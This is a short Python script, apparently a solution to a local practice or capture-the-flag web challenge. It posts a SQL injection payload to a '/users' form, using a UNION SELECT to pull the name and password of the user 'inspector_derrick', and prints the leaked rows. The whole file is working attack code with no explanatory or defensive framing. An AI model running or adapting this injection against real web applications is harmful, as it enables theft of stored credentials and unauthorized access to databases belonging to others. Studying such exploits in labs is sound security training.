import sys
import requests
from bs4 import BeautifulSoup

addr = sys.argv[1] if len(sys.argv) > 1 else "http://0.0.0.0:5001"

url = addr + "/users"
payload = {'name': "peternotindata' UNION SELECT name,password FROM users WHERE name = 'inspector_derrick"}
r = requests.post(url, payload)
soup = BeautifulSoup(r.text, "html.parser")
if "Server Error" in soup.text:
    print("Nope, that's an error")
else:
    for entry in soup.find_all("p", {"class": "list-group-item"}):
        print(entry.text)
